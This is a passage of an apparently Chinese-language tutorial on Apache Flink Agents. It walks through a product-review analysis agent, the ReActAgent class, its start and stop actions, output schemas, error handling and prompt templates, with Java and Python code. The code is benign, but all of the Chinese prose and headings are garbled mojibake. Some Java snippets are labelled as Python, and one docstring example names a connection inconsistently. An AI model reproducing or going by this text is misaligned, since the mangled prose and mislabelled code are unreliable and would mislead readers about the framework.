AgentsExecutionEnvironment agentsEnv =
        AgentsExecutionEnvironment.getExecutionEnvironment(env);

// Add Ollama chat model connection to be used by the ReviewAnalysisAgent.
agentsEnv.addResource(
        "ollamaChatModelConnection",
        ResourceType.CHAT_MODEL_CONNECTION,
        CustomTypesAndResources.OLLAMA_SERVER_DESCRIPTOR);
</code></pre>
<h5 id="åå»ºä»£ç">åå»ºä»£ç</h5>
<p>ä»¥ <code>ReviewAnalysisAgent</code> ä¸ºä¾ï¼å±ç¤ºå¦ä½å®ä¹æç¤ºè¯ãå·¥å·ãèå¤©æ¨¡ååå¨ä½ï¼ä»¥åå¦ä½å¤çèå¤©ååºå¹¶åéè¾åºäºä»¶ãæ´å¤ç»èè¯·åè [å·¥ä½æµä»£ç] ææ¡£ã<code>ProductSuggestionAgent</code> çä»£ç ä¸ä¹ç±»ä¼¼ã</p>
<pre><code class="language-Java">/**
 * An agent that uses a large language model (LLM) to analyze product reviews and generate a
 * satisfaction score and potential reasons for dissatisfaction.
 *
 * &lt;p&gt;This agent receives a product review and produces a satisfaction score and a list of reasons
 * for dissatisfaction. It handles prompt construction, LLM interaction, and output parsing.
 */
public class ReviewAnalysisAgent extends Agent {

    private static final ObjectMapper MAPPER = new ObjectMapper();

    @Prompt
    public static org.apache.flink.agents.api.prompt.Prompt reviewAnalysisPrompt() {
        return REVIEW_ANALYSIS_PROMPT;
    }

    @ChatModelSetup
    public static ResourceDescriptor reviewAnalysisModel() {
        return ResourceDescriptor.Builder.newBuilder(OllamaChatModelSetup.class.getName())
                .addInitialArgument("connection", "ollamaChatModelConnection")
                .addInitialArgument("model", "qwen3:8b")
                .addInitialArgument("prompt", "reviewAnalysisPrompt")
                .addInitialArgument("tools", Collections.singletonList("notifyShippingManager"))
                .addInitialArgument("extract_reasoning", "true")
                .build();
    }

    /**
     * Tool for notifying the shipping manager when product received a negative review due to
     * shipping damage.
     *
     * @param id The id of the product that received a negative review due to shipping damage
     * @param review The negative review content
     */
    @Tool(
            description =
                    "Notify the shipping manager when product received a negative review due to shipping damage.")
    public static void notifyShippingManager(
            @ToolParam(name = "id") String id, @ToolParam(name = "review") String review) {
        CustomTypesAndResources.notifyShippingManager(id, review);
    }

    /** Process input event and send chat request for review analysis. */
    @Action(listenEvents = {InputEvent.class})
    public static void processInput(InputEvent event, RunnerContext ctx) throws Exception {
        String input = (String) event.getInput();
        MAPPER.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
        CustomTypesAndResources.ProductReview inputObj =
                MAPPER.readValue(input, CustomTypesAndResources.ProductReview.class);

        ctx.getShortTermMemory().set("id", inputObj.getId());

        String content =
                String.format(
                        "{\n" + "\"id\": %s,\n" + "\"review\": \"%s\"\n" + "}",
                        inputObj.getId(), inputObj.getReview());
        ChatMessage msg = new ChatMessage(MessageRole.USER, "", Map.of("input", content));

        ctx.sendEvent(new ChatRequestEvent("reviewAnalysisModel", List.of(msg)));
    }

    @Action(listenEvents = ChatResponseEvent.class)
    public static void processChatResponse(ChatResponseEvent event, RunnerContext ctx)
            throws Exception {
        JsonNode jsonNode = MAPPER.readTree(event.getResponse().getContent());
        JsonNode scoreNode = jsonNode.findValue("score");
        JsonNode reasonsNode = jsonNode.findValue("reasons");
        if (scoreNode == null || reasonsNode == null) {
            throw new IllegalStateException(
                    "Invalid response from LLM: missing 'score' or 'reasons' field.");
        }
        List&lt;String&gt; result = new ArrayList&lt;&gt;();
        if (reasonsNode.isArray()) {
            for (JsonNode node : reasonsNode) {
                result.add(node.asText());
            }
        }

        ctx.sendEvent(
                new OutputEvent(
                        new CustomTypesAndResources.ProductReviewAnalysisRes(
                                ctx.getShortTermMemory().get("id").getValue().toString(),
                                scoreNode.asInt(),
                                result)));
    }
}
</code></pre>
<h5 id="ä¸-flink-éæ">ä¸ Flink éæ</h5>
<p>è¯»åææ¬æä»¶ä¸­çååè¯è®ºæµä½ä¸ºè¾å¥ DataStreamï¼ç¨ <code>ReviewAnalysisAgent</code> åæå¹¶çæç»æ DataStreamï¼æåæå°è¾åºã</p>
<pre><code class="language-Java">// Read product reviews from input_data.txt file as a streaming source.
// Each element represents a ProductReview.
DataStream&lt;String&gt; productReviewStream =
       env.fromSource(
               FileSource.forRecordStreamFormat(
                               new TextLineInputFormat(),
                               new Path(inputDataFile.getAbsolutePath()))
                       .build(),
               WatermarkStrategy.noWatermarks(),
               "streaming-agent-example");

// Use the ReviewAnalysisAgent to analyze each product review.
DataStream&lt;Object&gt; reviewAnalysisResStream =
       agentsEnv
               .fromDataStream(productReviewStream)
               .apply(new ReviewAnalysisAgent())
               .toDataStream();

// Print the analysis results to stdout.
reviewAnalysisResStream.print();

// Execute the Flink pipeline.
agentsEnv.execute();
</code></pre>
<h3 id="23-react-agent">2.3 ReAct Agent</h3>
<p>æ¬å¿«éå¥é¨ç¨ä¸ä¸ªè¿·ä½ ç¤ºä¾æ¼ç¤ºå¦ä½ç¨ Flink Agents æå»ºæµå¼ ReAct Agentï¼</p>
<p><strong>è¯è®ºåæ</strong> ä»£çæç»­æ¶è´¹ååè¯è®ºæµï¼ç¨åä¸ªä»£çæåè¯åï¼1-5ï¼ä»¥åä¸æ»¡æåå ï¼è¥è¯è®ºæ¶åç©æµä¸æ»¡ï¼åèªå¨éç¥ç©æµç»çã</p>
<h4 id="231-ä»£ç å¯¼è¯»">2.3.1 ä»£ç å¯¼è¯»</h4>
<h5 id="åå¤ä»£çæ§è¡ç¯å¢-1">åå¤ä»£çæ§è¡ç¯å¢</h5>
<p>åå»º Agents æ§è¡ç¯å¢ï¼æ³¨åå¯ç¨çèå¤©æ¨¡åè¿æ¥ä¸å·¥å·ã</p>
<pre><code class="language-python"># Set up the Flink streaming environment and the Agents execution environment.
env = StreamExecutionEnvironment.get_execution_environment()
agents_env = AgentsExecutionEnvironment.get_execution_environment(env)

# Add Ollama chat model connection and notify shipping manager tool to be used
# by the Agent.
agents_env.add_resource(
    "ollama_server",
    ResourceDescriptor(clazz=OllamaChatModelConnection, request_timeout=120),
).add_resource(
    "notify_shipping_manager", Tool.from_callable(notify_shipping_manager)
)
</code></pre>
<h5 id="åå»º-react-agent">åå»º ReAct Agent</h5>
<p>å®ä¾å ReAct Agentï¼éç½®èå¤©æ¨¡åãæç¤ºè¯ä»¥åç»æçè¾åºæ¨¡å¼ã</p>
<pre><code class="language-python">review_analysis_react_agent = ReActAgent(
    chat_model=ResourceDescriptor(
        clazz=OllamaChatModelSetup,
        connection="ollama_server",
        model="qwen3:8b",
        tools=["notify_shipping_manager"],
    ),
    prompt=review_analysis_react_prompt,
    output_schema=ProductReviewAnalysisRes,
)
</code></pre>
<h5 id="ä¸-flink-éæ-1">ä¸ Flink éæ</h5>
<p>è¯»åååè¯è®ºææ¬æä»¶çæ Source DataStreamï¼ç¨ ReAct Agent åæå¹¶çæç»æ DataStreamï¼æåæå°è¾åºã</p>
<pre><code class="language-python"># Read product reviews from a text file as a streaming source.
# Each line in the file should be a JSON string representing a ProductReview.
product_review_stream = env.from_source(
    source=FileSource.for_record_stream_format(
        StreamFormat.text_line_format(),
        f"file:///{current_dir}/resources/",
    )
    .monitor_continuously(Duration.of_minutes(1))
    .build(),
    watermark_strategy=WatermarkStrategy.no_watermarks(),
    source_name="streaming_agent_example",
).map(
    lambda x: ProductReview.model_validate_json(
        x
    )  # Deserialize JSON to ProductReview.
)

# Use the ReAct agent to analyze each product review and notify the shipping manager
# when needed.
review_analysis_res_stream = (
    agents_env.from_datastream(
        input=product_review_stream, key_selector=lambda x: x.id
    )
    .apply(review_analysis_react_agent)
    .to_datastream()
)

# Print the analysis results to stdout.
review_analysis_res_stream.print()
</code></pre>
<h2 id="0x03-reactagent">0x03 ReActAgent</h2>
<p>ReActAgent æ¯ Agent æ½è±¡çä¸ä¸ªå·ä½å®ç°ï¼å±ç¤ºäºè¿äºæ½è±¡å¦ä½ååå·¥ä½ã</p>
<ul>
<li>èµæºç®¡çï¼ç®¡çèå¤©æ¨¡ååæç¤ºè¯èµæº</li>
<li>Actionå®ä¹ï¼å®ä¹ start_action å stop_action å¤çè¾å¥åè¾åº</li>
<li>äºä»¶å¤çï¼ååº InputEvent å ChatResponseEvent</li>
<li>éç½®ç®¡çï¼æ¯æéè¯¯å¤çç­ç¥éç½®</li>
<li>è¾åºæ ¼å¼åï¼æ¯æåºäº schema çè¾åºéªè¯åæ ¼å¼å</li>
</ul>
<p>è¿ç§æ½è±¡è®¾è®¡ä½¿å¾ Agent ç³»ç»å·æé«åº¦ççµæ´»æ§åå¯æ©å±æ§ï¼å¼åèå¯ä»¥éè¿ç»åä¸åçèµæºãactionsåéç½®æ¥æå»ºæ»¡è¶³ç¹å®éæ±çAgentã</p>
<h3 id="31-å®ä¹">3.1 å®ä¹</h3>
<p>ReActAgent çå®ä¹å¦ä¸ã</p>
<pre><code class="language-python">class ReActAgent(Agent):
    """Built-in implementation of ReAct agent which is based on the function
    call ability of llm.

    This implementation is not based on the foundational ReAct paper which uses
    prompt to force llm output contain &lt;Thought&gt;, &lt;Action&gt; and &lt;Observation&gt; and
    extract tool calls by text parsing. For a more robust and feature-rich
    implementation we use the tool/function call ability of current llm, and get
    the tool calls from response directly.

    Example:
        ::

            class OutputData(BaseModel):
                result: int


            env = AgentsExecutionEnvironment.get_execution_environment()

            # register resource to execution environment
            (
                env.add_resource(
                    "ollama",
                    ResourceDescriptor(clazz=OllamaChatModelConnection, model=model),
                )
                .add_resource("add", add)
                .add_resource("multiply", multiply)
            )

            # prepare prompt
            prompt = Prompt.from_messages(
                messages=[
                    ChatMessage(
                        role=MessageRole.SYSTEM,
                        content='An example of output is {"result": 30.32}.',
                    ),
                    ChatMessage(
                        role=MessageRole.USER, content="What is ({a} + {b}) * {c}"
                    ),
                ],
            )

            # create ReAct agent.
            agent = ReActAgent(
                chat_model=ResourceDescriptor(
                    clazz=OllamaChatModelSetup,
                    connection="ollama_server",
                    tools=["notify_shipping_manager"],
                ),
                prompt=prompt,
                output_schema=OutputData,
            )
    """

    def __init__(
        self,
        *,
        chat_model: ResourceDescriptor,
        prompt: Prompt | None = None,
        output_schema: type[BaseModel] | RowTypeInfo | None = None,
    ) -&gt; None:
        """Init method of ReActAgent.

        Parameters
        ----------
        chat_model : ResourceDescriptor
            The descriptor of the chat model used in this ReAct agent.
        prompt : Optional[Prompt] = None
            Prompt to instruct the llm, could include input and output example,
            task and so on.
        output_schema : Optional[Union[type[BaseModel], RowTypeInfo]] = None
            The schema should be RowTypeInfo or subclass of BaseModel. When user
            provide output schema, ReAct agent will add system prompt to instruct
            response format of llm, and add output parser according to the schema.
        """
        super().__init__()
        self.add_resource(_DEFAULT_CHAT_MODEL, chat_model)

        if output_schema:
            if isinstance(output_schema, type) and issubclass(output_schema, BaseModel):
                json_schema = output_schema.model_json_schema()
            elif isinstance(output_schema, RowTypeInfo):
                json_schema = str(output_schema)
            else:
                err_msg = f"Output schema {output_schema.__class__} is not supported."
                raise TypeError(err_msg)
            schema_prompt = f"The final response should be json format, and match the schema {json_schema}."
            self._resources[ResourceType.PROMPT][_DEFAULT_SCHEMA_PROMPT] = (
                Prompt.from_text(text=schema_prompt)
            )

        if prompt:
            self._resources[ResourceType.PROMPT][_DEFAULT_USER_PROMPT] = prompt

        self.add_action(
            name="stop_action",
            events=[ChatResponseEvent],
            func=self.stop_action,
            output_schema=OutputSchema(output_schema=output_schema),
        )
</code></pre>
<h3 id="32-æ·±åº¦å®å¶">3.2 æ·±åº¦å®å¶</h3>
<p>Flink å¯¹ ReActAgent åäºæ·±åº¦å®å¶ï¼ä½¿å¶è½å¨åå¸å¼æµå¤çç¯å¢ä¸­é«ææ§è¡ï¼å¹¶æä¾äºä¸°å¯çåè½æ¥ç®å LLM åºç¨å¼åã</p>
<h4 id="321-reactagent-ç¹è²">3.2.1 ReActAgent ç¹è²</h4>
<h5 id="æµå¼å¤çéé">æµå¼å¤çéé</h5>
<p>Flink å°ä¼ ç»ç ReAct æ¨¡å¼ééå°äºæµå¤çç¯å¢ä¸­ï¼</p>
<ul>
<li>éè¿ InputEvent å OutputEvent åè£è¾å¥è¾åºæ°æ®</li>
<li>å©ç¨ Flink çäºä»¶é©±å¨æ¶æå®ç°å¼æ­¥å¤ç</li>
<li>éè¿ RunnerContext ç®¡çç¶æåèµæº</li>
</ul>
<pre><code class="language-python">agents_env = AgentsExecutionEnvironment.get_execution_environment(env)
agents_env.fromDataStream(dataStream) # ä»DataStreamè¾å¥
agents_env.fromTable(table) # ä»Tableè¾å¥
agents_env.fromList(list) # ä»Listè¾å¥

review_analysis_res_stream = (
        agents_env.from_datastream( # ä»DataSteamåå»ºAgentæµç¨
            input=product_review_stream, key_selector=lambda x: x.id
        )
        .apply(review_analysis_react_agent) # åºç¨Agent
        .to_datastream() # è½¬æ¢åStream
    )
</code></pre>
<h5 id="ç¹å®çè¡ä¸ºæ¨¡å¼">ç¹å®çè¡ä¸ºæ¨¡å¼</h5>
<p>ReActAgent å®ç°äºç¹å®ç ReActï¼Reasoning + Actionï¼èå¼ï¼è¿æ¯ä¸ç§ç»åæ¨çåè¡å¨ç AI Agent æ¨¡å¼ãå®åç½®äºä¸¤ä¸ªæ ¸å¿å¨ä½ï¼start_action()å stop_action()ãä½¿ç¨é¢å®ä¹çæµç¨æ¥å¤çè¾å¥å¹¶çæè¾åºï¼èéè®©ç¨æ·å®å¨èªå®ä¹è¡ä¸ºé»è¾ã</p>
<ul>
<li>start_action æ¥æ¶è¾å¥å¹¶åé ChatRequestEvent</li>
<li>stop_action å¤ç ChatResponseEvent å¹¶äº§çæç»è¾åº</li>
</ul>
<h5 id="é®æ§ç¶ææ¯æ">é®æ§ç¶ææ¯æ</h5>
<p>æ¯æFlinkçé®æ§ç¶æç¹æ§</p>
<pre><code class="language-python">review_analysis_res_stream = (
    agents_env.from_datastream(
        input=product_review_stream, key_selector=lambda x: x.id
    )
    .apply(review_analysis_react_agent)
    .to_datastream()
)
</code></pre>
<h5 id="llm-éæä¼å">LLM éæä¼å</h5>
<p>ReActAgent ä¸é¨ä¸º LLM äº¤äºè¿è¡ä¼åï¼åç½®äºæç¤ºè¯ç®¡çåæ ¼å¼ååè½ï¼æ¯æç»æåè¾åºæ¨¡å¼ï¼å¯ä»¥æå®è¾åºçæ°æ®schemaï¼éæäºéè¯¯å¤çç­ç¥ï¼å½LLMè¾åºä¸ç¬¦åé¢ææ ¼å¼æ¶å¯ä»¥éæ©å¤±è´¥æèå¿½ç¥ã</p>
<h5 id="èµæºç®¡çæ¹å¼">èµæºç®¡çæ¹å¼</h5>
<p>ReActAgent ä¸­èªå¨æ·»å é»è®¤èµæºï¼ç¸æ¯æ®éçAgentï¼ReActAgent ä¼èªå¨ä¸ºç¨æ·è®¾ç½®å¥½å¿è¦çèµæºï¼ç®åä½¿ç¨æµç¨ãéè¿ç»ä¸çèµæºç®¡çç³»ç»ä¸FlinkéæãReActAgent éè¿ _DEFAULT_CHAT_MODEL ç­å¸¸éå¼ç¨å¨ AgentsExecutionEnvironment ä¸­æ³¨åçèµæºã</p>
<pre><code class="language-python">agents_env.add_resource(_DEFAULT_CHAT_MODEL, chat_model)
agents_env.addResource("ollama_server", ResourceDescriptor(...))
agents_env.addResource("notify_shipping_manager", Tool.from_callable(...))
</code></pre>
<h5 id="ç±»åä¿¡æ¯å¤ç">ç±»åä¿¡æ¯å¤ç</h5>
<p>Flink Agentè½å¤å¤çFlinkçç±»åç³»ç»</p>
<pre><code class="language-python">        if (outputSchema != null) {
            String jsonSchema;
            // æ¯æRowTypeInfoåPOJOç±»å
            if (outputSchema instanceof RowTypeInfo) {
            	// å¤çRowç±»å
                jsonSchema = outputSchema.toString();
                outputSchema = new OutputSchema((RowTypeInfo) outputSchema);
            } else if (outputSchema instanceof Class) {
            	// å¤çPOJOç±»å
                try {
                    jsonSchema = mapper.generateJsonSchema((Class&lt;?&gt;) outputSchema).toString();
                } catch (JsonMappingException e) {
                    throw new RuntimeException(e);
                }
            } 
</code></pre>
<h5 id="éè¯¯å¤çæºå¶">éè¯¯å¤çæºå¶</h5>
<p>Flink ä¸º ReActAgent å®ç°äºçµæ´»çå¤çå¤çç­ç¥ï¼è¿è¡ç¨æ·éæ©å¨è§£æå¤±è´¥æ¶æåºå¼å¸¸è¿æ¯å¿½ç¥éè¯¯ã</p>
<pre><code class="language-python">        except Exception:
            if error_handling_strategy == ErrorHandlingStrategy.IGNORE:
                logging.warning(
                    f"The response of llm {output} doesn't match schema constraint, ignoring."
                )
                return
            elif error_handling_strategy == ErrorHandlingStrategy.FAIL:
                raise
</code></pre>
<h5 id="ç»æåè¾åºæ¯æ">ç»æåè¾åºæ¯æ</h5>
<p>Flink ä¸º ReActAgent æ·»å äºç»æåè¾åºçè½åï¼è¿æ ·å¯ä»¥è®© LLM çè¾åºç¬¦åé¢å®ä¹çæ°æ®ç»æï¼ä¾¿äºåç»­ç®¡çã</p>
<pre><code class="language-python">        if output_schema:
            if isinstance(output_schema, type) and issubclass(output_schema, BaseModel):
                json_schema = output_schema.model_json_schema()
            elif isinstance(output_schema, RowTypeInfo):
                json_schema = str(output_schema)
            else:
                err_msg = f"Output schema {output_schema.__class__} is not supported."
                raise TypeError(err_msg)
            schema_prompt = f"The final response should be json format, and match the schema {json_schema}."
            self._resources[ResourceType.PROMPT][_DEFAULT_SCHEMA_PROMPT] = (
                Prompt.from_text(text=schema_prompt)
            )
</code></pre>
<h5 id="æç¤ºè¯æ¨¡æ¿ç³»ç»">æç¤ºè¯æ¨¡æ¿ç³»ç»</h5>
<p>Flink å®ç°äºä¸ä¸ªå®æ´çæç¤ºè¯æ¨¡æ¿ç®¡çç³»ç»ï¼</p>
<ul>
<li>æ¯æå­ç¬¦ä¸²æ¨¡æ¿åæ¶æ¯åè¡¨æ¨¡å</li>
<li>æä¾æ ¼å¼ååè½ï¼å¯ä»¥å¨ææ¿æ¢æ¨¡æ¿ä¸­çå ä½ç¬¦</li>
<li>èªå¨å¤çä¸åç±»åè¾å¥çè½¬æ¢</li>
</ul>
<h5 id="å·¥å·è°ç¨éæ">å·¥å·è°ç¨éæ</h5>
<p>Flink å°å·¥å·è°ç¨éæå° ReActAgentä¸­ã</p>
<pre><code class="language-python"># æ³¨åå·¥å·èµæº
    # Add Ollama chat model connection and notify shipping manager tool to be used
    # by the Agent.
    agents_env.add_resource(
        "ollama_server",
        ResourceDescriptor(clazz=OllamaChatModelConnection, request_timeout=120),
    ).add_resource(
        "notify_shipping_manager", Tool.from_callable(notify_shipping_manager)
    )
    
# å¨Agent ä¸­ä½¿ç¨å·¥å·
    # Create react agent
    review_analysis_react_agent = ReActAgent(
        chat_model=ResourceDescriptor(
            clazz=OllamaChatModelSetup,
            connection="ollama_server",
            model="qwen3:8b",
            tools=["notify_shipping_manager"],
        ),
        prompt=review_analysis_react_prompt,
        output_schema=ProductReviewAnalysisRes,
    )
</code></pre>
<h5 id="è¿è¡æ¶åä½">è¿è¡æ¶åä½</h5>
<ul>
<li>æ§è¡ç¯å¢è´è´£è°åº¦åè¿è¡Agentä¸­çåä¸ªç»ä»¶</li>
<li>Agentéè¿RunnerContext è®¿é®å¨ç¯å¢ä¸­æ³¨åçèµæº</li>
<li>æ´ä¸ªè¿ç¨éç¨äºä»¶é©±å¨çæ¹å¼ï¼éè¿åéåæ¥æ¶äºä»¶æ¥æ¨è¿æ§è¡æµç¨</li>
</ul>
<h3 id="33-å¸åæ§è¡æµç¨">3.3 å¸åæ§è¡æµç¨</h3>
<p>å¯¹äº ReActAgent æ¥è¯´ï¼å·ä½ééæµç¨å¦ä¸ï¼</p>
<ul>
<li>ç¯å¢åå§åï¼éè¿ AgentsExecutionEnvironment.get_execution_environment(env) è·åéå½çæ§è¡ç¯å¢</li>
<li>èµæºéç½®ï¼ä½¿ç¨ addResource() æ·»å æ¨¡åãå·¥å·ç­èµæº</li>
<li>è¾å¥è®¾ç½®ï¼éè¿fromDataStream()ã fromTable()ç­è®¾ç½®è¾å¥æº</li>
<li>Agentåºç¨ï¼ä½¿ç¨ apply()æ¹æ³åºç¨Agent é»è¾</li>
<li>è¾åºè·åï¼éè¿ toDataStream() è·åå¤çåç DataStream</li>
<li>æ§è¡ï¼éè¿execute() è§¦åFlinkä½ä¸æ§è¡</li>
</ul>
<p>å¸åçæ§è¡æµç¨å¦ä¸ï¼</p>
<ul>
<li>run å½æ°æ¥æ¶å°è¾å¥æ°æ®</li>
<li>åå»ºInputEvent å¹¶åéå°äºä»¶éå</li>
<li>start_actionå¤çInputEventï¼æ ¼å¼åè¾å¥å¹¶åé ChatRequestEvent</li>
<li>LLMå¤çåäº§ç ChatResponseEvent</li>
<li>stop_action å¤ç ChatResponseEventï¼è§£æç»æå¹¶åé OutputEvent</li>
<li>run å½æ°æ¶é OutputEvent å¹¶è¿åç»æ</li>
</ul>
<p>å³é®ç¹ç¹æ¯ï¼</p>
<ul>
<li>äºä»¶é©±å¨ï¼ä½¿ç¨äºä»¶éåé©±å¨æ´ä¸ªæ§è¡æµç¨</li>
<li>ä¸ä¸æéç¦»ï¼æ¯ä¸ªé®å¼å¯¹åºç¬ç«çæ§è¡ä¸ä¸æ</li>
<li>å¼æ­¥æ¯æï¼è½ç¶æ¬å°æ§è¡ç¯å¢åéå°åæ­¥æ§è¡ï¼ä½ä»ç¶æ¯æå¼æ­¥æ¥å£</li>
<li>ç¶æç®¡çï¼éè¿ LocalRunnerContext ç®¡çç­æè®°å¿åèµæºéç½®</li>
</ul>
<h3 id="34-start_action-ä¸-stop_action">3.4 start_action ä¸ stop_action</h3>
<p><strong>æ´ä½æµç¨ç¹è²</strong></p>
<p>è¿ä¸¤ä¸ª action ææå®æ´ç ReAct æ¨¡å¼ï¼</p>
<ul>
<li>å¼å§-ç»ææ¨¡å¼ï¼start_action ä½ä¸ºå¥å£ï¼å°åå§è¾å¥è½¬åä¸ºéå LLM å¤ççæ ¼å¼ï¼stop_action ä½ä¸ºåºå£ï¼å° LLM ååºè½¬æ¢ä¸ºç»æåè¾åºã</li>
<li>ä¸­é´å¤çéæåï¼ç¨æ·æ éå³å¿ä¸­é´æ­¥éª¤ï¼å¦å·¥å·è°ç¨ãä¸ä¸ææ£ç´¢ç­ï¼ï¼è¿äºç±åç½®ç CHAT_MODEL_ACTIONãTOOL_CALL_ACTION ç­èªå¨å¤çã</li>
<li>å¯éç½®æ§ï¼æ¯æèªå®ä¹ Promptãè¾åº schema å®ä¹åéè¯¯å¤çç­ç¥ã</li>
</ul>
<p><strong>åè½</strong></p>
<p>ReActAgent ç start_action ä¸ stop_action åå·ç¹å¾ï¼äºèåå«æ¿æå¯¹è¯çåèµ·ä¸ç»ç»èè´£ã</p>
<ul>
<li>start_action è´è´£è¾å¥äºä»¶çå¤çãå®é¦åæ¥æ¶ InputEventï¼ä½ä¸ºæ´ä¸ª Agent æµç¨çèµ·ç¹ï¼å¯æ¥ååå§ç±»åãå¤æå¯¹è±¡æ Row ç­å¤ç§æ°æ®ãè¥æä¾ Promptï¼åä»¥æ­¤æ ¼å¼åç¨æ·è¾å¥ï¼å°ç®åå­ç¬¦ä¸²æå¤æå¯¹è±¡ï¼å¦ Row æ POJOï¼çå±æ§èªå¨æåå¹¶å¡«å¥æ¨¡æ¿ãéåï¼ç³»ç»èªå¨è¿½å  schema promptï¼çº¦æå¤§æ¨¡åè¾åºç»æï¼åå°æ´çåçåå®¹å°è£ä¸º ChatRequestEventï¼è§¦ååç»­å¤çï¼é»è®¤è°ç¨ _DEFAULT_CHAT_MODEL å®æé¦æ¬¡çæã</li>
<li>stop_action åå¤çè¾åºäºä»¶ãå®ä»¥ ChatResponseEvent ä¸ºè¾å¥ï¼æ å¿å¤§æ¨¡åçæå®æ¯ï¼æ¯æ´ä¸ªæµç¨çç»ç¹ãè¯¥å¨ä½æ¯ææ schema è§£æä¸éªè¯è¿åç»æï¼å¯å° JSON ææ¬è½¬æ¢ä¸º Pydantic æ¨¡åæ RowTypeInfo æå®ç»æï¼å¹¶æä¾éè¯¯å¤çç­ç¥ï¼å¿½ç¥ææåºå¼å¸¸ï¼ï¼ä¿è¯è¾åºç±»åå®å¨ä¸ä¸å¡ä¸è´æ§ã</li>
</ul>
<p><strong>ä¸å¶ä»ç»ä»¶çåä½</strong></p>
<p>å¨ ReActAgent åå§åæ¶æ³¨åè¿ä¸¤ä¸ª actionï¼</p>
<pre><code class="language-python">self.add_action(
    name="stop_action",
    events=[ChatResponseEvent],
    func=self.stop_action,
    output_schema=OutputSchema(output_schema=output_schema),
)
</code></pre>
<p>è¿ä¸¤ä¸ª action ä¸ Agent åç½®çå¶ä» actionï¼å¦å·¥å·è°ç¨ãä¸ä¸ææ£ç´¢ï¼éåå·¥ä½ï¼å¨ ActionExecutionOperator ä¸­å½¢æä¸ä¸ªå®æ´çäºä»¶é©±å¨å¤çé¾ã</p>
<h3 id="35-è¾å¥è¾åº">3.5 è¾å¥è¾åº</h3>
<p>Flink Agent çè¾å¥è¾åºå·æä»¥ä¸å ä¸ªæ¾èç¹ç¹ï¼å¹¶éè¿ç¹å®æºå¶ä¸Flinkè¿è¡ééã</p>
<h4 id="351-äºä»¶é©±å¨æ¶æ">3.5.1 äºä»¶é©±å¨æ¶æ</h4>
<p>Flink Agent åºäºäºä»¶é©±å¨æ¨¡åï¼è¾å¥åè¾åºé½æ¯éè¿äºä»¶å¯¹è±¡è¿è¡ä¼ éï¼</p>
<ul>
<li>è¾å¥ï¼éè¿InputEvent å°è£åå§æ°æ®</li>
<li>è¾åºï¼éè¿OutputEventå°è£å¤çç»æ</li>
<li>ä¸­é´äºä»¶ï¼åæ¬ ChatRequestEventãChatResponseEventãToolRequestEventãToolResponseEventç­</li>
</ul>
<h4 id="352-ç»ä¸çæ°æ®å°è£">3.5.2 ç»ä¸çæ°æ®å°è£</h4>
<p>æææ°æ®é½è¢«å°è£æäºä»¶å¯¹è±¡ï¼ä¾¿äºAgentåé¨æµè½¬åå¤çã</p>
<h4 id="353-æ¯æå¤ç§æ°æ®ç±»å">3.5.3 æ¯æå¤ç§æ°æ®ç±»å</h4>
<p>è¾å¥æ¯æå¤ç§æ°æ®ç±»åï¼</p>
<ul>
<li>åºæ¬æ°æ®ç±»å</li>
<li>Flink Rowå¯¹è±¡</li>
<li>POJOå¯¹è±¡</li>
<li>å¤æåµå¥ç»æ</li>
</ul>
<p>è¾åºåæ ·æ¯æçµæ´»çæ°æ®ç»æï¼å¯ä»¥éè¿schemaè¿è¡çº¦æ</p>
<h4 id="354-åç½®æ¨¡æ¿æ¯æ">3.5.4 åç½®æ¨¡æ¿æ¯æ</h4>
<p>éè¿Promptç±»æ¯ææ¨¡æ¿åè¾å¥å¤çï¼å¯ä»¥å®ä¹å¤æçæç¤ºè¯æ¨¡æ¿</p>
<h3 id="36-æ¨¡æ¿ç³»ç»">3.6 æ¨¡æ¿ç³»ç»</h3>
<p>æ¨¡æ¿å¯ä»¥ç¨å¨æç¤ºè¯åSchemaãFlink Agent ä¸­çæ¨¡æ¿ç³»ç»ä¸»è¦å¨ Prompt ç±»ä¸­å®ç°ï¼æ¯æä¸¤ç§ç±»åçæ¨¡æ¿ï¼</p>
<h4 id="361-å­ç¬¦ä¸²æ¨¡æ¿">3.6.1 å­ç¬¦ä¸²æ¨¡æ¿</h4>
<p>æåºæ¬çæ¨¡æ¿å½¢å¼ï¼å°±æ¯ä¸ä¸ªåå«å ä½ç¬¦çå­ç¬¦ä¸²ï¼</p>
<pre><code class="language-java">        String specialTemplate = "Handle special chars: {text} with symbols like @#$%^&amp;*()";
        Prompt specialPrompt = new Prompt(specialTemplate);

        Map&lt;String, String&gt; specialVars = new HashMap&lt;&gt;();
        specialVars.put("text", "Hello &amp; Welcome!");

        String result = specialPrompt.formatString(specialVars);

</code></pre>
<h4 id="362-æ¶æ¯æ¨¡æ¿">3.6.2 æ¶æ¯æ¨¡æ¿</h4>
<p>æ´å¤æçæ¨¡æ¿å½¢å¼ï¼åå«å¤ä¸ª ChatMessage å¯¹è±¡ï¼å¯ä»¥æå®ä¸åçè§è²ã</p>
<pre><code class="language-python">        List&lt;ChatMessage&gt; multipleMessages =
                Arrays.asList(
                        new ChatMessage(MessageRole.SYSTEM, "You are a helpful assistant."),
                        new ChatMessage(MessageRole.USER, "First message"),
                        new ChatMessage(MessageRole.ASSISTANT, "I understand"),
                        new ChatMessage(
                                MessageRole.USER, "Second message - this should be the response"));

        Prompt multiPrompt = new Prompt(multipleMessages);

</code></pre>
<p>æ¨¡æ¿çç®¡çæµç¨å¦ä¸ï¼</p>
<ul>
<li>æ¨¡æ¿åå»ºï¼ç¨æ·åå»º Prompt  å¯¹è±¡ï¼å¯ä»¥æ¯å­ç¬¦ä¸²ææ¶æ¯åè¡¨ã</li>
<li>åéæ¿æ¢ï¼ä½¿ç¨ formatString() æè formatMessages() æ¹æ³å¯¹ä¼ å¥åéæ å°è¿è¡æ¿æ¢</li>
<li>LLM è°ç¨ï¼æ ¼å¼åçæ¶æ¯è¢«åéç»LLMè¿è¡å¤çã</li>
</ul>
<pre><code class="language-python">class Prompt(SerializableResource, ABC):
    """Base prompt abstract."""

    @staticmethod
    def from_messages(messages: Sequence[ChatMessage]) -&gt; "Prompt":
        """Create prompt from sequence of ChatMessage."""
        return LocalPrompt(template=messages)

    @staticmethod
    def from_text(text: str) -&gt; "Prompt":
        """Create prompt from text string."""
        return LocalPrompt(template=text)

    @abstractmethod
    def format_string(self, **kwargs: str) -&gt; str:
        """Generate text string from template with additional arguments."""

    @abstractmethod
    def format_messages(
        self, role: MessageRole = MessageRole.SYSTEM, **kwargs: str
    ) -&gt; List[ChatMessage]:
        """Generate list of ChatMessage from template with additional arguments."""

    @classmethod
    @override
